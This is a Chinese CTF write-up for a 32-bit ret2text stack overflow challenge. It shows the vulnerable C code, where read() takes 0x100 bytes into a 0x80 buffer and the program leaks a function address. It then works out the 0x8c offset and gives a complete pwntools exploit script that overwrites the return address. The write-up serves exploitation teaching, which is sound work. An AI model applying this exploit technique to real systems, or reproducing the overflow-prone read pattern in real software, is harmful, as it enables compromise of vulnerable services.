# week1easy_stack

## 题目简述

这是一个 32 位 ret2text 栈溢出。`func` 的缓冲区只有 `0x80` 字节，`read` 却允许写入 `0x100` 字节。程序启用了 PIE，但启动时会直接打印 `shell` 函数的运行时地址，因此可以利用这次泄漏绕过代码地址随机化，再覆盖返回地址跳入 `shell`。

```c
void shell()
{
    puts("C0ngratulation!!!");
    system("cat flag");
}

void func()
{
    char buf[0x80];
    memset(buf, 0, 0x20);
    puts("D0 U know asm?");
    read(0, buf, 0x100);
}

void my_init()
{
    /* 省略标准流初始化 */
    printf("give u a magic_address %p\n", shell);
}
```

## 解题过程

调试官方二进制可见，`buf` 起始地址到保存的 `ebp` 相差 `0x88` 字节，返回地址位于 `ebp+4`，因此覆盖返回地址所需的总偏移为：

$$
0x88 + 4 = 0x8c
$$

先解析程序打印的十六进制地址，再发送 `0x8c` 字节填充和该地址：

```python
from pwn import *

context.binary = "./main"
context.arch = "i386"


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(context.binary.path)


io = start()
io.recvuntil(b"magic_address ")
shell = int(io.recvline().strip(), 16)
log.info("shell = %#x", shell)

payload = b"A" * 0x8C + p32(shell)
io.send(payload)
io.interactive()
```

这里不需要计算 PIE 基址，因为服务已经泄漏最终的函数地址；也不需要注入代码，因为目标函数已经包含读取 flag 的逻辑。

## 方法总结

- 核心技巧：解析运行时函数地址泄漏，再用栈溢出执行 ret2text。
- 识别信号：`read` 长度大于栈缓冲区，且程序主动打印可利用函数指针。
- 复用要点：缓冲区声明大小不等于返回地址偏移，应以反汇编或 cyclic 调试结果为准；32 位地址必须使用 `p32`。
